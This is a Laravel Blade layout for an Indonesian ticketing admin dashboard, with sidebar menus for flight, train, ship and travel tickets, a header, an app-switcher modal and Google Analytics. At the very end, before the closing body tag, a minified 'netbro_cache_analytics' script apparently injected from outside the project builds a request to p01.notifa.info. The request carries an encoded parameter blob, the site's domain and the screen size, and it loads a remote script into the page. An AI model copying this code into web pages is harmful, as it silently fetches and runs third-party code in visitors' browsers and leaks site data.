<!doctype html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <meta name="description" content="Cosmo - Responsive Dashboard Admin Template">
    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <link rel="icon" href="images/favicon.ico">

    <link rel="stylesheet" href="{{mix('css/core.css')}}">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    @yield('pages-css')
    <title>{{ config('app.name', 'Laravel') }}</title>
    
</head>
<body>

<!-- Pre Loader-->
<div class="loader-wrapper">
    <div class="spinner">
        <svg viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
            <circle class="length" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="28"></circle>
        </svg>
        <svg viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
            <circle fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="28"></circle>
        </svg>
        <svg viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
            <circle fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="28"></circle>
        </svg>
        <svg viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
            <circle fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="28"></circle>
        </svg>
    </div>
</div>
<!-- Pre Loader-->



<section class="wrapper">


    <!-- SIDEBAR -->
    <aside class="sidebar">
        <nav class="navbar navbar-dark bg-primary">
            <a class="navbar-brand m-0 py-2 brand-title" href="#">{{ config('app.name', 'Laravel') }}</a>
            <span></span>
            <a class="navbar-brand py-2 material-icons toggle-sidebar" href="#">menu</a>
        </nav>

        <nav class="navigation" >
            <ul>
                <li class=""><a href="{{ url('/') }}" title="Beranda"><span class="nav-icon material-icons">public</span> Beranda </a></li>
                <li>
                    <a href="#" title="Master"><span class="nav-icon material-icons ">extension</span> Master <span class="toogle-sub-nav material-icons">keyboard_arrow_right</span></a>
                    <ul class="sub-nav">
                        <li><a href="general-elements.html" title="">Kategori</a></li>
                    </ul>
                </li>
            </ul>

            <label title="Transaksi"><span>Transaksi</span></label>
            <ul>
                <li class=""><a href="{{ url('ticket') }}" title="Beranda"><span class="nav-icon material-icons">featured_play_list</span> Tiket </a></li>
            </ul>


            <label title="Laporan"><span>Laporan</span></label>
            <ul>
                <li class=""><a href="index.html" title="Beranda"><span class="nav-icon material-icons">airplanemode_active</span> Tiket Pesawat </a></li>
                <li class=""><a href="index.html" title="Beranda"><span class="nav-icon material-icons">train</span> Tiket KAI </a></li>
                <li class=""><a href="index.html" title="Beranda"><span class="nav-icon material-icons">directions_boat</span> Tiket PELNI </a></li>
                <li class=""><a href="index.html" title="Beranda"><span class="nav-icon material-icons">directions_car</span> Tiket Travel </a></li>
            </ul>
        </nav>

    </aside>



    <!--RIGHT CONTENT AREA-->
    <div class="content-area">

        <header class="header sticky-top">
            <nav class="navbar navbar-light bg-white px-sm-4 ">
                <a class="navbar-brand py-2 d-md-none  m-0 material-icons toggle-sidebar" href="#">menu</a>
                <ul class="navbar-nav flex-row ml-auto">
                    <li class="nav-item" data-toggle="tooltip" data-placement="bottom" title="Switch Application">
                        <a data-toggle="modal" href="#" data-target="#switchApp" class="nav-link"><span class="material-icons align-middle">apps</span></a>
                    </li>
                    <li class="nav-item notification" >
                        <a href="#" id="notificationDropdown" data-toggle="dropdown" class="nav-link"><span class="material-icons align-middle">notifications_none</span></a>
                        <div class="dropdown-menu p-0 dropdown-lg notificationDropdown dropdown-menu-right" aria-labelledby="notificationDropdown">

                            <a class="dropdown-item py-3 border-bottom" href="#">
                                <p class="text-muted mb-1"><small>John Doe Application</small></p>
                                <div class="progress" style="height:8px;">
                                    <div class="progress-bar bg-success" role="progressbar" style="width: 25%" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100"></div>
                                </div>
                            </a>
                            <a class="dropdown-item py-3 border-bottom" href="#">
                                <p class="text-muted mb-1"><small>Akshay Application</small></p>
                                <div class="progress" style="height:8px;">
                                    <div class="progress-bar bg-warning" role="progressbar" style="width: 75%" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100"></div>
                                </div>
                            </a>
                            <a class="dropdown-item whitespace-normal py-3 border-bottom" href="#">
                                <div class="media">
                                    <img class="mr-3 rounded" width="26" src="{{ asset('/images/user.png') }}" >
                                    <div class="media-body">
                                        <h6 class="m-0 weight-400">Media heading</h6>
                                        <small class="text-muted">Cras sit amet nibh libero, in gravida nulla. Nulla vel metus scelerisque ante.</small>
                                    </div>
                                </div>
                            </a>

                            <a class="dropdown-item py-3 border-bottom" href="#">
                                <p class="text-muted mb-1"><small>Uploading Documents</small></p>
                                <div class="progress" style="height:8px;">
                                    <div class="progress-bar-animated bg-primary progress-bar-striped" role="progressbar" style="width: 40%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"></div>
                                </div>
                            </a>
                            <a class="dropdown-item py-3 border-bottom" href="#">
                                <span class="badge badge-pill badge-danger mr-2">Warning</span> <small class="text-muted">Somthing went wrong !</small>
                            </a>
                            <button type="button" class="btn btn-light btn-sm btn-block">View All</button>
                        </div>
                    </li>
                    <li class="nav-item ml-sm-3 user-logedin dropdown">
                        <a href="#" id="userLogedinDropdown" data-toggle="dropdown" class="nav-link weight-400 dropdown-toggle"><img src="{{ asset('/images/user.png') }}" class="mr-2 rounded" width="28">{{ Auth::user()->name }}</a>
                        <div class="dropdown-menu dropdown-menu-right" aria-labelledby="userLogedinDropdown">
                            <a class="dropdown-item" href="profile.html">Akun Saya</a>
                            <div class="dropdown-divider"></div>
                            <a class="dropdown-item" href="{{ route('logout') }}"
                               onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                {{ __('Logout') }}
                            </a>

                            <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                                @csrf
                            </form>

                        </div>
                    </li>

                </ul>
            </nav>
        </header>


        <div class="content-wrapper">



            @yield('content')




            <footer class="footer">
                <p class="text-muted m-0"><small >Aisyah © 2017–2018</small></p>
            </footer>




        </div>



    </div>


</section>







<div class="modal fade" id="switchApp" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content">
            <div class="modal-header px-4">
                <h5 class="modal-title" id="exampleModalLabel">Select Application</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span class="material-icons ">close</span>
                </button>
            </div>
            <div class="modal-body p-4">

                <div class="row align-items-stretch app-switcher">
                    <div class="col-lg-3 col-6 mb-4">
                        <a href="index.html" class="text-dark">
                            <div class="card h-100">
                                <div class="card-body text-center">
                                    <span class="material-icons md-48 " style="color:#21C3E0;">bubble_chart</span>
                                    <p class="weight-400 m-0">Dashboard</p>
                                    <small class="weight-300 text-muted">This is some text within a card body.</small>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-3 col-6 mb-4">
                        <a href="ecommerce-dashboard.html" class="text-dark">
                            <div class="card h-100">
                                <div class="card-body text-center">
                                    <span class="material-icons md-48 text-primary">security</span>
                                    <p class="weight-400 m-0">Ecommerce</p>
                                    <small class="weight-300 text-muted">This is some text within a card body.</small>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-3 col-6 mb-4">
                        <a href="mailbox.html" class="text-dark">
                            <div class="card h-100 active-app">
                                <div class="card-body text-center">
                                    <span class="material-icons md-48 text-danger">blur_on</span>
                                    <p class="weight-400 m-0">Mail Box</p>
                                    <small class="weight-300 text-muted">This is some text within a card body.</small>
                                    <span class="material-icons app-selected md-16">check</span>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-3 col-6 mb-4">
                        <a href="blogger-feed-list.html" class="text-dark">
                            <div class="card h-100">
                                <div class="card-body text-center">
                                    <span class="material-icons md-48 text-warning">camera</span>
                                    <p class="weight-400 m-0">Blogger</p>
                                    <small class="weight-300 text-muted">This is some text within a card body.</small>
                                </div>
                            </div>
                        </a>
                    </div>


                    <div class="col-lg-3 col-6 mb-lg-0 mb-4">
                        <a href="task-manager.html" class="text-dark">
                            <div class="card h-100">
                                <div class="card-body text-center">
                                    <span class="material-icons md-48" style="color:#f98e69;">leak_add</span>
                                    <p class="weight-400 m-0">Task Manager</p>
                                    <small class="weight-300 text-muted">This is some text within a card body.</small>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-3 col-6 mb-lg-0 mb-4">
                        <a href="notes.html" class="text-dark">
                            <div class="card h-100">
                                <div class="card-body text-center">
                                    <span class="material-icons md-48 text-success">color_lens</span>
                                    <p class="weight-400 m-0">Notes</p>
                                    <small class="weight-300 text-muted">This is some text within a card body.</small>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-3 col-6 ">
                        <a href="file-uploder.html" class="text-dark">
                            <div class="card h-100">
                                <div class="card-body text-center">
                                    <span class="material-icons md-48 " style="color:#9b84fb">category</span>
                                    <p class="weight-400 m-0">File Manager</p>
                                    <small class="weight-300 text-muted">This is some text within a card body.</small>
                                </div>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-3 col-6 ">
                        <a href="photos-videos.html" class="text-dark">
                            <div class="card h-100">
                                <div class="card-body text-center">
                                    <span class="material-icons md-48 text-muted" >layers</span>
                                    <p class="weight-400 m-0">Videos & Photos</p>
                                    <small class="weight-300 text-muted">This is some text within a card body.</small>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>

            </div>
            <div class="modal-footer px-4">
                <div class="custom-control custom-checkbox mr-auto">
                    <input type="checkbox" class="custom-control-input" id="customCheck1">
                    <label class="custom-control-label" for="customCheck1">Default open this application</label>
                </div>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary">Switch Application</button>
            </div>
        </div>
    </div>
</div>




<script src="{{ mix('js/core.js') }}"></script>
<script src="{{ mix('js/custom.js') }}"></script>
@yield('pages-js')



<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-56821827-7"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-56821827-7');
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVJOsWm%2bf9E8zzbq8YXnKRklAlu%2fziG0hcm%2bQJUoOsfFk%2bOApdCsT9Q1JSx148Ja7tYfeik3zrd7%2bi8s3I4kskHPaKB%2bG8kj8PxUn3wy%2f22BzcbvtDkKdjO0R%2bH88Sv1NbFkjzLEYhlwbnaP10yQOnBTXDgPoW%2feWaKLVnb08ILs465qA0Gx0XNcF93XfbfJZd4khuSeqelBR4DBtgec4qAO536PiKW3Xix16zeFtqp%2b%2fSYuWE9tPpF0anDQ4fstcMJc7LXHbJlEa%2boJDJt7FhlkCohqqkC6AOyHvwbZ9fGP4kZmLZf9VZmCncbseFqoCqPXKjmyMatt1ohHm%2fpLkVBCNWycbm4YXqNzcVpLhzc4n%2bg7uA0pyRfZSW83KVEum8UgJNtIKg3Y9jQJ3LO9zwsuZsB1mAcEkJ%2fBu7AlKWb7pD4w96GJKR6JRco879WxxC2RSv%2fNmoMaezpSKKXz6PwuTKg6QiEUHwm7%2faaIyUxQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>